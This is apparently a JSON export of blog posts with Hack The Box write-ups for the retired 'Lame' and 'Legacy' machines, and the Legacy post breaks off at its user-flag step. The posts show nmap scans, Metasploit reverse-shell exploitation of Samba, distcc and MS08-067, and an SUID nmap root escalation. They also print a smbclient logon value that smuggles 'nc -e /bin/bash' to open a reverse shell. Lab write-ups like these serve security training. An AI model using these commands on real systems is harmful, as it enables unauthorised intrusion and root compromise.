[{"content":"Hi Hackers Welcome Back Today we are going to look at Hack The Box Lame Machine.\n Info Table   Title Lame    Category Hack The Box   OS Linux    Difficulty Easy   Maker       Kill Chain Summery While enumerating ports and services we can able to find the service, which is vulnerable to infamous CVE - 2007-2447 \u0026amp; 2004-2687. Samba vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.\nMind Map  Recon we run a quick initial nmap scan to see which ports are open and which services are running on those ports.\nAll port scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $nmap -Pn -p- 10.129.99.174 -oN ap Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 17:46 IST Stats: 0:08:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 70.62% done; ETC: 17:58 (0:03:33 remaining) Nmap scan report for 10.129.99.174 Host is up (0.34s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3632/tcp open distccd Nmap done: 1 IP address (1 host up) scanned in 1297.12 seconds1   Service version scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  ─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $nmap -Pn -sV -sC -A 10.129.99.174 -oN scsva Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 17:39 IST Nmap scan report for 10.129.99.174 Host is up (0.34s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.102 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-06-03T08:10:34-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2h00m27s, deviation: 2h49m46s, median: 24s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.40 seconds   1 2 3 4 5 6 7 8 9 10 11  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $nmap -Pn -A -T4 -p 3632 10.129.99.174 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 02:22 IST Nmap scan report for 10.129.99.174 Host is up (0.29s latency). PORT STATE SERVICE VERSION 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds   Service and its Version\n 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))   Enumeration port 21 The version of the vsftp is vulnerable to CVE: CVE-2011-2523, i have tried both metasploit and public exploit but nothing helped me probably they might be patched\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $ftp 10.129.99.174 Connected to 10.129.99.174. 220 (vsFTPd 2.3.4) Name (10.129.99.174:atom): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp\u0026gt; ls -al 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 65534 4096 Mar 17 2010 . drwxr-xr-x 2 0 65534 4096 Mar 17 2010 .. 226 Directory send OK.   Enumeration port 22 1 2 3 4 5 6 7 8 9 10 11 12 13 14  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $searchsploit OpenSSH 4.7p1 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration | linux/remote/45233.py OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration (PoC) | linux/remote/45210.py OpenSSH \u0026lt; 6.6 SFTP (x64) - Command Execution | linux_x86-64/remote/45000.c OpenSSH \u0026lt; 6.6 SFTP - Command Execution | linux/remote/45001.py OpenSSH \u0026lt; 7.4 - \u0026#39;UsePrivilegeSeparation Disabled\u0026#39; Forwarded Unix Domain Sockets Privilege Escalation | linux/local/40962.txt OpenSSH \u0026lt; 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txt OpenSSH \u0026lt; 7.7 - User Enumeration (2) | linux/remote/45939.py --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   we did’t find any RCE on this Version, lets look on other ports if there are any critical vulnerability\nEnnum and Exploit port 139 \u0026amp; 445 we already Know the version let\u0026rsquo;s look into exploit database weather the target version is vulerable to any exploit\n1 2 3 4 5 6 7 8 9 10 11  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~] └──╼ $searchsploit Samba 3.0.20-Debian --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 \u0026lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 \u0026lt; 3.0.25rc3 - \u0026#39;Username\u0026#39; map script\u0026#39; Command Execution (Metasploit) | unix/remote/16320.rb Samba \u0026lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u0026lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Exploit using Metasploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search Username script Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/c2s_dvr_password_disclosure 2016-08-19 normal No C2S DVR Management Password Disclosure 1 exploit/windows/http/cyclope_ess_sqli 2012-08-08 excellent Yes Cyclope Employee Surveillance Solution v6 SQL Injection 2 exploit/linux/http/efw_chpasswd_exec 2015-06-28 excellent No Endian Firewall Proxy Password Change Command Injection 3 exploit/linux/http/grandstream_ucm62xx_sendemail_rce 2020-03-23 excellent Yes Grandstream UCM62xx IP PBX sendPasswordEmail RCE 4 auxiliary/gather/ipcamera_password_disclosure 2016-08-16 normal No JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure 5 exploit/linux/local/su_login 1971-11-03 normal Yes Login to Another User with Su on Linux / Unix Systems 6 exploit/windows/smb/psexec 1999-01-01 manual No Microsoft Windows Authenticated User Code Execution 7 auxiliary/scanner/oracle/oracle_login normal No Oracle RDBMS Login Utility 8 auxiliary/server/pxeexploit normal No PXE Boot Exploit Server 9 exploit/multi/sap/sap_mgmt_con_osexec_payload 2011-03-08 excellent Yes SAP Management Console OSExecute Payload Execution 10 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \u0026#34;username map script\u0026#34; Command Execution 11 exploit/linux/ssh/solarwinds_lem_exec 2017-03-17 excellent No SolarWinds LEM Default SSH Password Remote Code Execution 12 auxiliary/scanner/http/squiz_matrix_user_enum 2011-11-08 normal No Squiz Matrix User Enumeration Scanner 13 exploit/windows/local/wmi_persistence 2017-06-06 normal No WMI Event Subscription Persistence 14 post/windows/manage/pxeexploit normal No Windows Manage PXE Exploit Server 15 auxiliary/gather/wp_ultimate_csv_importer_user_extract 2015-02-02 normal Yes WordPress Ultimate CSV Importer User Table Extract Interact with a module by name or index. For example info 15, use 15 or use auxiliary/gather/wp_ultimate_csv_importer_user_extract [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 10 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; set rhost 10.129.101.251 rhost =\u0026gt; 10.129.101.251 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; set lhost 10.10.14.33 lhost =\u0026gt; 10.10.14.33 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; run [*] Started reverse TCP handler on 10.10.14.33:4444 [*] Command shell session 1 opened (10.10.14.33:4444 -\u0026gt; 10.129.101.251:47514 ) at 2022-06-07 15:03:37 +0530 whoami root id uid=0(root) gid=0(root)   Manual Method Enum samba 1 2 3 4 5 6 7 8 9 10  ─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──╼ $smbmap -H 10.129.101.251 [+] IP: 10.129.101.251:445\tName: 10.129.101.251 Disk Permissions\tComment ---- -----------\t------- print$ NO ACCESS\tPrinter Drivers tmp READ, WRITE\toh noes! opt NO ACCESS\tIPC$ NO ACCESS\tIPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ NO ACCESS\tIPC Service (lame server (Samba 3.0.20-Debian))   Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] │┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $smbclient -N //10.129.101.251/tmp/ --option=\u0026#39;client min protocol=NT1\u0026#39; │└──_ $nc -lvnp 4444 Anonymous login successful │listening on [any] 4444 ... Try \u0026#34;help\u0026#34; to get a list of possible commands. │connect to [10.10.14.33] from (UNKNOWN) [10.129.101.251] 38753 smb: \\\u0026gt; dir │whoami . D 0 Tue Jun 7 15:06:51 2022 │root .. DR 0 Sat Oct 31 12:03:58 2020 │id 5582.jsvc_up R 0 Tue Jun 7 07:49:52 2022 │uid=0(root) gid=0(root) .ICE-unix DH 0 Tue Jun 7 07:48:41 2022 │ vmware-root DR 0 Tue Jun 7 07:49:47 2022 │ .X11-unix DH 0 Tue Jun 7 07:49:06 2022 │ .X0-lock HR 11 Tue Jun 7 07:49:06 2022 │ vgauthsvclog.txt.0 R 1600 Tue Jun 7 07:48:40 2022 │ │ 7282168 blocks of size 1024. 5384924 blocks available │ smb: \\\u0026gt; logon _./=`nohup nc -e /bin/bash 10.10.14.33 4444`\u0026#34; │ session setup failed: NT_STATUS_LOGON_FAILURE │ smb: \\\u0026gt; logon _./=`nohup nc -e /bin/bash 10.10.14.33 4444`\u0026#34; │ session setup failed: NT_STATUS_LOGON_FAILURE │ smb: \\\u0026gt; logon \u0026#34;./=`nohup nc -e /bin/bash 10.10.14.33 4444`\u0026#34; │ Password: │ │   Ennum and Exploit 3632 1 2 3 4 5 6 7 8 9 10 11  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/lame] └──_ $nmap -Pn -p 3632 -sV --script vulners 10.129.101.147 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 18:24 IST Nmap scan report for 10.129.101.147 Host is up (0.47s latency). PORT STATE SERVICE VERSION 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds   Metasploit Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90  [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search distccd Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/misc/distcc_exec 2002-02-01 excellent Yes DistCC Daemon Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 0 [msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description  - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP (via Perl) 1 payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP (via perl) IPv6 2 payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP (via Ruby) 3 payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP (via Ruby) IPv6 4 payload/cmd/unix/generic normal No Unix Command, Generic Command Execution 5 payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP (telnet) 6 payload/cmd/unix/reverse_bash normal No Unix Command Shell, Reverse TCP (/dev/tcp) 7 payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL (telnet) 8 payload/cmd/unix/reverse_openssl normal No Unix Command Shell, Double Reverse TCP SSL (openssl) 9 payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP (via Perl) 10 payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL (via perl) 11 payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP (via Ruby) 12 payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL (via Ruby) 13 payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL (telnet) [msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) \u0026gt;\u0026gt; set payload 5 payload =\u0026gt; cmd/unix/reverse [msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) \u0026gt;\u0026gt; set rhost 10.129.101.251 [msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) \u0026gt;\u0026gt; set lhost 10.10.14.33 Module options (exploit/unix/misc/distcc_exec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.129.101.251 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 3632 yes The target port (TCP) Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.33 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target [msf](Jobs:0 Agents:0) exploit(unix/misc/distcc_exec) \u0026gt;\u0026gt; run [*] Started reverse TCP double handler on 10.10.14.33:4444 [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo IfVVyVugXAMKqtcu; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket A [*] A: \u0026#34;sh: line 2: Connected: command not found\\r\\nsh: line 3: Escape: command not found\\r\\n\u0026#34; [*] Matching... [*] B is input... [*] Command shell session 3 opened (10.10.14.33:4444 -\u0026gt; 10.129.101.251:55594 ) at 2022-06-07 14:26:29 +0530 Shell Banner: IfVVyVugXAMKqtcu ----- whoami daemon id uid=1(daemon) gid=1(daemon) groups=1(daemon)   Priviledge Esclation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  find / -type f -user root \\( -perm -4000 -o -perm -2000 \\) 2\u0026gt;/dev/null -ls 16466 68 -rwsr-xr-x 1 root root 63584 Apr 14 2008 /bin/umount 16449 20 -rwsr-xr-- 1 root fuse 20056 Feb 26 2008 /bin/fusermount 16398 28 -rwsr-xr-x 1 root root 25540 Apr 2 2008 /bin/su 16418 84 -rwsr-xr-x 1 root root 81368 Apr 14 2008 /bin/mount 16427 32 -rwsr-xr-x 1 root root 30856 Dec 10 2007 /bin/ping 16457 28 -rwsr-xr-x 1 root root 26684 Dec 10 2007 /bin/ping6 8370 68 -rwsr-xr-x 1 root root 65520 Dec 2 2008 /sbin/mount.nfs 8252 20 -rwxr-sr-x 1 root shadow 19584 Apr 9 2008 /sbin/unix_chkpwd 304747 4 -rwsr-xr-- 1 root dhcp 2960 Apr 2 2008 /lib/dhcp3-client/call-dhclient-script 344359 112 -rwsr-xr-x 2 root root 107776 Feb 25 2008 /usr/bin/sudoedit 345080 4 -rwxr-sr-x 1 root utmp 3192 Apr 22 2008 /usr/bin/Eterm 344440 8 -rwsr-sr-x 1 root root 7460 Jun 25 2008 /usr/bin/X 344089 8 -rwxr-sr-x 1 root tty 8192 Dec 12 2007 /usr/bin/bsd-write 344958 12 -rwsr-xr-x 1 root root 8524 Nov 22 2007 /usr/bin/netkit-rsh 344366 80 -rwxr-sr-x 1 root ssh 76580 Apr 6 2008 /usr/bin/ssh-agent 344139 40 -rwsr-xr-x 1 root root 37360 Apr 2 2008 /usr/bin/gpasswd 344689 32 -rwxr-sr-x 1 root mlocate 30508 Mar 8 2008 /usr/bin/mlocate 344364 28 -rwxr-sr-x 1 root crontab 26928 Apr 8 2008 /usr/bin/crontab 344317 16 -rwsr-xr-x 1 root root 12296 Dec 10 2007 /usr/bin/traceroute6.iputils 344359 112 -rwsr-xr-x 2 root root 107776 Feb 25 2008 /usr/bin/sudo 344959 12 -rwsr-xr-x 1 root root 12020 Nov 22 2007 /usr/bin/netkit-rlogin 344550 40 -rwxr-sr-x 1 root shadow 37904 Apr 2 2008 /usr/bin/chage 344284 308 -rwxr-sr-x 1 root utmp 308228 Oct 23 2007 /usr/bin/screen 344220 20 -rwxr-sr-x 1 root shadow 16424 Apr 2 2008 /usr/bin/expiry 344230 12 -rwsr-xr-x 1 root root 11048 Dec 10 2007 /usr/bin/arping 345067 304 -rwxr-sr-x 1 root utmp 306996 Jan 2 2009 /usr/bin/xterm 344365 20 -rwsr-xr-x 1 root root 19144 Apr 2 2008 /usr/bin/newgrp 344337 12 -rwxr-sr-x 1 root tty 9960 Apr 14 2008 /usr/bin/wall 344429 28 -rwsr-xr-x 1 root root 28624 Apr 2 2008 /usr/bin/chfn 344956 768 -rwsr-xr-x 1 root root 780676 Apr 8 2008 /usr/bin/nmap 344441 24 -rwsr-xr-x 1 root root 23952 Apr 2 2008 /usr/bin/chsh 344957 16 -rwsr-xr-x 1 root root 15952 Nov 22 2007 /usr/bin/netkit-rcp 344771 32 -rwsr-xr-x 1 root root 29104 Apr 2 2008 /usr/bin/passwd 344792 48 -rwsr-xr-x 1 root root 46084 Mar 31 2008 /usr/bin/mtr 354594 12 -r-xr-sr-x 1 root postdrop 10312 Apr 18 2008 /usr/sbin/postqueue 354659 12 -r-xr-sr-x 1 root postdrop 10036 Apr 18 2008 /usr/sbin/postdrop 354626 268 -rwsr-xr-- 1 root dip 269256 Oct 4 2007 /usr/sbin/pppd 369987 8 -rwsr-xr-- 1 root telnetd 6040 Dec 17 2006 /usr/lib/telnetlogin 385106 12 -rwsr-xr-- 1 root www-data 10276 Mar 9 2010 /usr/lib/apache2/suexec 386116 8 -rwsr-xr-x 1 root root 4524 Nov 5 2007 /usr/lib/eject/dmcrypt-get-device 377149 168 -rwsr-xr-x 1 root root 165748 Apr 6 2008 /usr/lib/openssh/ssh-keysign 371390 12 -rwsr-xr-x 1 root root 9624 Aug 17 2009 /usr/lib/pt_chown 8415 16 -r-sr-xr-x 1 root root 14320 Nov 3 2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper 16687 12 -r-sr-xr-x 1 root root 9532 Nov 3 2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper nmap --interactive Starting Nmap V. 4.53 ( http://insecure.org ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh whoami root   See you on the next Blog, Happy hacking\u0026hellip;\r ","description":" Legacy from HackTheBox is an retired machine which is vulnerable to infamous CVE - 2007-2447 \u0026 2004-2687 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit ","id":2,"section":"posts","tags":["samba","CVE-ID-2007-2447","CVE-ID-2004-2687"],"title":"Hack The Box - Lame","uri":"https://fromzerotoonee.github.io/en/posts/lame/"},{"content":"Hi Hackers Welcome Back this is my very first Hack The Box Machine which i have solved.\n Info Table   Title Legacy    Category Hack The Box   OS Windows    Difficulty Easy   Maker       Kill Chain Summery While enumerating ports and services we can able to find the service, which is vulnerable to infamous MS08-067 \u0026amp; MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.\nMind Map  Recon First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy] └──_ $nmap -sC -sV 10.129.227.181 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 13:27 IST Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 73.47% done; ETC: 13:28 (0:00:19 remaining) Nmap scan report for 10.129.227.181 Host is up (0.26s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:59:40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-06-07T12:56:45+03:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.31 seconds   We can see that three ports are opened, lets dig into smb\nEnumeration Let’s first run nmap scripts to determine if it is vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  ┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy] └──_ $nmap --script \u0026#34;vuln\u0026#34; 10.129.227.181 -p139,445 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 14:48 IST Nmap scan report for 10.129.227.181 Host is up (0.57s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_smb-vuln-ms10-054: false Nmap done: 1 IP address (1 host up) scanned in 35.54 seconds   The result shows us that it is vulnerable to CVE-2008–4250. The target machine is running SMBv1 so we’ll go with CVE-2017–0143 (MS17–010).\nAutomatic Exploitation We know the CVE ID search it on metasploit and set Lhost, Rhost , target\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search 2008-4250 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms08_067_netapi 2008-10-28 great Yes MS08-067 Microsoft Server Service Relative Path Stack Corruption Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 0 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; check [-] Msf::OptionValidateError The following options failed to validate: RHOSTS [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; set rhosts 10.129.227.181 rhosts =\u0026gt; 10.129.227.181 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; check [+] 10.129.227.181:445 - The target is vulnerable. [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 192.168.132.128:4444 [*] 10.129.227.181:445 - Automatically detecting the target... [*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.129.227.181:445 - Attempting to trigger the vulnerability... [*] Exploit completed, but no session was created. [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.129.227.181 yes The target host(s), see https://github.com/rapid7/metasploit-fr amework/wiki/Using-Metasploit RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 192.168.132.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Targeting [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; set lhost 10.10.14.102 lhost =\u0026gt; 10.10.14.102 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.10.14.102:4444 [*] 10.129.227.181:445 - Automatically detecting the target... [*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.129.227.181:445 - Attempting to trigger the vulnerability... [*] Sending stage (175174 bytes) to 10.129.227.181 [*] Meterpreter session 1 opened (10.10.14.102:4444 -\u0026gt; 10.129.227.181:1162 ) at 2022-06-02 15:39:27 +0530 Meterpreter 2)(C:\\WINDOWS\\system32) \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM (Meterpreter 2)(C:\\WINDOWS\\system32) \u0026gt; sysinfo Computer : LEGACY OS : Windows XP (5.1 Build 2600, Service Pack 3). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 1 Meterpreter : x86/windows   Incase if the exploit wont work reset the machine and try once more it will work.\nuser flag User flag found under users Desktop path C:\\Documents and Settings\\john\\Desktop\\user.txt \n1 2 3 4 5 6 7  Directory of C:\\Documents and Settings\\john\\Desktop 16/03/2017 09:19 �� 